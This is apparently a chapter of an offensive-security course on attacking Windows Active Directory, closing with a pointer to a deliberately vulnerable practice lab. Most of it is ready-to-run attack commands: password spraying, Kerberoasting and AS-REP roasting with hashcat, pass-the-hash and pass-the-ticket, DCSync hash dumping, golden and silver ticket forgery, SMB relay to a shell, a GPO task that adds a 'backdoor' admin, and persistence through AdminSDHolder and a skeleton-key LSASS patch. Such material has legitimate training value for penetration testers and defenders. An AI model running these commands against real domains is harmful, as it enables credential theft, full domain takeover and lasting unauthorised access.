---
title: 'Active Directory Attacks'
subtitle: 'BloodHound, Kerberoasting, AS-REP Roasting, Pass-the-Ticket, DCSync, Golden Tickets — dominating Windows domains.'
chapter: 16
level: 'advanced'
readingTime: '18 min'
topics:
  [
    'Active Directory',
    'Kerberos',
    'BloodHound',
    'Kerberoasting',
    'DCSync',
    'Golden Ticket',
    'LDAP',
    'SMB relay'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

Active Directory is a corporate HR database that also controls who can open which door. Compromise AD and you're not just root on one machine — you're the HR director who can fire and hire anyone, unlock any room, and issue any badge.

</Callout>

## Active Directory Fundamentals

```
Domain Controller (DC)    → server running AD DS, the crown jewel
Domain                    → logical grouping (corp.local)
Forest                    → collection of domains with trust relationships
Organizational Unit (OU)  → container for users/computers/groups
Group Policy Object (GPO) → settings pushed to computers and users
Trust                     → relationship allowing auth between domains

Key objects:
  Users       → domain accounts
  Computers   → machine accounts (end in $)
  Groups      → Security groups control access
  SPNs        → Service Principal Names → Kerberoasting targets
```

## Initial Enumeration

```bash
# From Linux — enumerate with credentials
# (gained via password spray, phishing, or guest access)

# LDAPsearch — query AD via LDAP
ldapsearch -x -H ldap://192.168.1.100 -D "user@corp.local" -w 'Password1' \
  -b "DC=corp,DC=local" "(objectclass=user)" sAMAccountName

# Impacket — comprehensive AD toolkit
# List users
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py \
  -all corp.local/user:Password1

# Enumerate domain info
python3 /usr/share/doc/python3-impacket/examples/rpcclient.py \
  -U "user%Password1" 192.168.1.100

# CrackMapExec — Swiss army knife for AD
crackmapexec smb 192.168.1.0/24 -u user -p 'Password1' --users
crackmapexec smb 192.168.1.100 -u user -p 'Password1' --groups
crackmapexec smb 192.168.1.100 -u user -p 'Password1' --shares
crackmapexec smb 192.168.1.100 -u user -p 'Password1' --pass-pol
```

```powershell
# From Windows (domain-joined machine)
# PowerView — PowerShell AD enumeration
Import-Module PowerView.ps1

Get-Domain                          # domain info
Get-DomainController                # list DCs
Get-DomainUser | select samaccountname, description, pwdlastset
Get-DomainGroup "Domain Admins" | select member
Get-DomainComputer | select dnshostname, operatingsystem
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainOU | select distinguishedname
Find-LocalAdminAccess               # where is current user local admin?
Invoke-ShareFinder                  # find accessible shares
```

## BloodHound — Attack Path Mapping

BloodHound visualizes attack paths to Domain Admin. It's the most important AD tool.

```bash
# Step 1: Collect data with SharpHound (Windows) or BloodHound.py (Linux)

# BloodHound.py from Linux
pip install bloodhound
python3 -m bloodhound -u user -p 'Password1' -d corp.local -dc 192.168.1.100 -c All

# SharpHound from Windows (inside domain)
./SharpHound.exe -c All
# Or via PowerShell:
Invoke-BloodHound -CollectionMethod All

# Step 2: Start BloodHound
sudo neo4j start
bloodhound &
# Login: neo4j / (set on first run)
# Import the zip from SharpHound/BloodHound.py

# Step 3: Run pre-built queries
# "Find Shortest Paths to Domain Admins"
# "Find Principals with DCSync Rights"
# "Find Kerberoastable Users"
# "Find AS-REP Roastable Users"
# "Find Computers with Unconstrained Delegation"
```

BloodHound shows you the attack path in seconds that would take hours to find manually.

## Password Spraying

AD environments lock accounts after N failed attempts. Spray slowly.

```bash
# CrackMapExec — spray one password across all users
crackmapexec smb 192.168.1.100 -u users.txt -p 'Winter2024!' --continue-on-success

# Check lockout policy first!
crackmapexec smb 192.168.1.100 -u user -p 'Password1' --pass-pol
# Bad password count, lockout threshold, observation window

# Kerbrute — fast UDP-based spray (no lockout logs on older DCs)
./kerbrute passwordspray -d corp.local --dc 192.168.1.100 users.txt 'Winter2024!'

# Generate username list from OSINT
python3 linkedin2username.py -c 'corp' -n 'Corp Inc' > users.txt
```

## Kerberoasting

Service accounts with SPNs have their TGS tickets encrypted with their NTLM hash. Request the ticket, crack offline.

```bash
# From Linux
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  corp.local/user:Password1 -dc-ip 192.168.1.100 -request

# Output: TGS-REP hashes (format $krb5tgs$23$...)
# Save to file and crack:
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# From Windows
# PowerView:
Invoke-Kerberoast -OutputFormat Hashcat | fl hash

# Rubeus:
.\Rubeus.exe kerberoast /format:hashcat /output:hashes.txt
```

**Why it works:** Any domain user can request TGS tickets for any SPN. The ticket is encrypted with the service account's password hash. If the service account has a weak password, you crack it offline.

## AS-REP Roasting

Accounts with "Do not require Kerberos pre-authentication" enabled skip the pre-auth step — you can request their AS-REP and crack it offline. No credentials needed.

```bash
# Find accounts without pre-auth (from Linux, no creds needed)
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  corp.local/ -dc-ip 192.168.1.100 -usersfile users.txt -no-pass -format hashcat

# With credentials (finds accounts automatically)
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  corp.local/user:Password1 -dc-ip 192.168.1.100 -request -format hashcat

# Crack:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# From Windows — Rubeus
.\Rubeus.exe asreproast /format:hashcat /output:asrep.txt
```

## Pass-the-Hash (Windows)

```bash
# psexec with hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  corp.local/Administrator@192.168.1.100 -hashes :NTLM_HASH

# wmiexec
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  corp.local/Administrator@192.168.1.100 -hashes :NTLM_HASH

# CME spray hash across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H :NTLM_HASH --local-auth
```

## Pass-the-Ticket

```bash
# Export all tickets from memory (Windows, admin required)
.\Rubeus.exe dump /nowrap

# Or via Mimikatz
sekurlsa::tickets /export

# Import ticket
.\Rubeus.exe ptt /ticket:base64_ticket_here
# or: kerberos::ptt ticket.kirbi

# From Linux with ccache file
export KRB5CCNAME=ticket.ccache
python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass corp.local/user@DC01
```

## DCSync — Dump All Domain Hashes

With `Replicating Directory Changes` rights (Domain Admin, or explicitly granted), you can pull all password hashes from the DC as if you were another DC doing replication.

```bash
# From Linux
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/Administrator:Password1@192.168.1.100

# Target specific user
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/Administrator:Password1@192.168.1.100 -just-dc-user krbtgt

# From Windows — Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv   # all users
```

## Golden Ticket

With the `krbtgt` NTLM hash (from DCSync), forge Kerberos TGTs for any user, even nonexistent ones. Valid until krbtgt password changes (most organizations never change it).

```bash
# Requirements:
# - krbtgt NTLM hash (from DCSync)
# - Domain SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# Get domain SID
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py \
  corp.local/user:Password1@192.168.1.100 | head -5

# Mimikatz — forge Golden Ticket
kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:KRBTGT_NTLM_HASH /ptt

# Now you have a TGT as "FakeAdmin" (Domain Admin) — valid for 10 years by default
dir \\DC01\C$   # access domain controller share
```

## Silver Ticket

Forge TGS tickets for specific services using the service account hash — more targeted, less logged than Golden Ticket.

```bash
# Requirements: service account NTLM hash (from Kerberoasting, credentials, or DCSync)

# Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /target:fileserver.corp.local /service:cifs \
  /rc4:SERVICE_ACCOUNT_HASH /ptt

# Access file server as Administrator
dir \\fileserver.corp.local\C$
```

## SMB Relay Attack

Instead of cracking NTLMv2 hashes from Responder, relay them directly:

```bash
# Requirements:
# - SMB signing disabled (check with CrackMapExec)
# - Responder + ntlmrelayx running together

# Check SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay-targets.txt
# Machines with signing:False → relay targets

# Configure Responder: disable SMB and HTTP (ntlmrelayx handles those)
sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Terminal 1: Responder (capture and forward hashes)
sudo responder -I eth0 -rdwf

# Terminal 2: ntlmrelayx (relay to targets)
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf relay-targets.txt -smb2support

# When a Windows machine sends NTLM auth for anything (file share, web):
# → Responder captures → relays to target → if target has SMB signing off → SYSTEM shell

# For interactive shell:
python3 ntlmrelayx.py -tf relay-targets.txt -smb2support -i
# Connect to relay shell: nc 127.0.0.1 11000
```

## Attacking GPOs

```powershell
# Find GPOs you can modify
Get-DomainGPO | Get-ObjectACL -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite" -and
                 $_.SecurityIdentifier -match "S-1-5-21-...(user SID)" }

# If you can write a GPO:
# Add scheduled task via SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" --Arguments "/c net user backdoor Password1! /add && net localgroup administrators backdoor /add" \
  --GPOName "Default Domain Policy"
```

## Persistence in AD

```powershell
# AdminSDHolder — objects in AdminSDHolder propagate ACLs to protected groups
# Add yourself to AdminSDHolder ACL → survives Group membership cleanup

$victim = "S-1-5-21-...user-SID"
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity $victim -Rights All

# DSyncAll rights — grant DCSync to your account
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity user -Rights DCSync

# Skeleton Key — patch LSASS so any account accepts "mimikatz" as password
# (until reboot)
privilege::debug
misc::skeleton
# Now: any user can auth with "mimikatz" as password
```

## Real Project: AD Lab Setup

```bash
# Vulnerable AD lab: GOAD (Game of Active Directory)
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD
# Requires VirtualBox + Vagrant
vagrant up
# Provisions: 5 VMs with intentional AD vulnerabilities

# Or: PwnLab/VulnAD VMs from VulnHub

# Practice path:
# 1. Password spray → find one valid cred
# 2. BloodHound → find Kerberoastable accounts
# 3. Kerberoast → crack service account password
# 4. Service account → local admin somewhere
# 5. Dump local hashes → PTH to other machines
# 6. Find DA or account with DCSync rights
# 7. DCSync → krbtgt hash → Golden Ticket
# 8. Own everything
```
